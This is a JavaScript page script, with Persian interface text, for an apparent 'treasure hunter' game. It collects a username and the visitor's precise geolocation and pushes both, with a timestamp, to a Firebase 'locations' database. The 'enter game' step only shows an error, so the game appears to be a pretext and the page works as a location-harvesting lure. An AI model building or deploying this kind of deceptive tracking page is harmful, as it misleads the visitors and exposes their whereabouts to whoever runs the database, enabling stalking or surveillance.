const firebaseConfig = {
    apiKey: "AIzaSyALODaXf0elRcIqQYABPd7Jamw8M3482LE",
    authDomain: "treasure-hunter-db822.firebaseapp.com",
    databaseURL: "https://treasure-hunter-db822-default-rtdb.firebaseio.com",
    projectId: "treasure-hunter-db822",
    storageBucket: "treasure-hunter-db822.firebasestorage.app",
    messagingSenderId: "658662293687",
    appId: "1:658662293687:web:a298ac3f313f390ed5cd32"
};

firebase.initializeApp(firebaseConfig);

const database = firebase.database();

const usernameStep = document.getElementById("usernameStep");
const locationStep = document.getElementById("locationStep");
const gameStep = document.getElementById("gameStep");

const usernameInput = document.getElementById("usernameInput");
const usernameBtn = document.getElementById("usernameBtn");
const startBtn = document.getElementById("startBtn");
const gameBtn = document.getElementById("gameBtn");

const playerName = document.getElementById("playerName");
const status = document.getElementById("status");

let username = "";


/* مرحله ۱: دریافت یوزرنیم */

usernameBtn.addEventListener("click", () => {

    username = usernameInput.value.trim();

    if (!username) {
        status.textContent = "❌ اول یه یوزرنیم وارد کن.";
        usernameInput.focus();
        return;
    }

    if (username.length < 2) {
        status.textContent = "❌ یوزرنیم باید حداقل ۲ کاراکتر باشه.";
        usernameInput.focus();
        return;
    }

    playerName.textContent = username;

    usernameStep.classList.add("hidden");
    locationStep.classList.remove("hidden");

    status.textContent = "حالا موقعیتت رو ارسال کن 📍";
});


/* Enter روی کیبورد */

usernameInput.addEventListener("keydown", (event) => {

    if (event.key === "Enter") {
        usernameBtn.click();
    }

});


/* مرحله ۲: Location */

startBtn.addEventListener("click", () => {

    if (!navigator.geolocation) {
        status.textContent =
            "❌ موقعیت مکانی توسط این مرورگر پشتیبانی نمی‌شود.";
        return;
    }

    startBtn.disabled = true;
    status.textContent = "📍 درحال دریافت موقعیت...";

    navigator.geolocation.getCurrentPosition(

        async (position) => {

            const data = {

                username: username,

                latitude: position.coords.latitude,

                longitude: position.coords.longitude,

                accuracy: position.coords.accuracy,

                timestamp: Date.now()

            };

            try {

                await database
                    .ref("locations")
                    .push(data);

                document.getElementById("lat").textContent =
                    data.latitude.toFixed(6);

                document.getElementById("lon").textContent =
                    data.longitude.toFixed(6);

                document.getElementById("accuracy").textContent =
                    `${Math.round(data.accuracy)} متر`;

                document
                    .getElementById("locationBox")
                    .classList.remove("hidden");

                locationStep.classList.add("hidden");

                gameStep.classList.remove("hidden");

                status.textContent =
                    `✅ موقعیت ${username} ثبت شد.`;

            } catch (error) {

                console.error(error);

                startBtn.disabled = false;

                status.textContent =
                    "❌ خطا در ثبت موقعیت. دوباره تلاش کن.";

            }

        },

        (error) => {

            console.error(error);

            startBtn.disabled = false;

            if (error.code === 1) {

                status.textContent =
                    "❌ دسترسی موقعیت مکانی داده نشد.";

            } else {

                status.textContent =
                    "❌ دریافت موقعیت ناموفق بود. دوباره تلاش کن.";

            }

        },

        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }

    );

});


/* مرحله ۳: ورود به بازی */

gameBtn.addEventListener("click", () => {

    document.getElementById("gameError")
        .classList.remove("hidden");

});
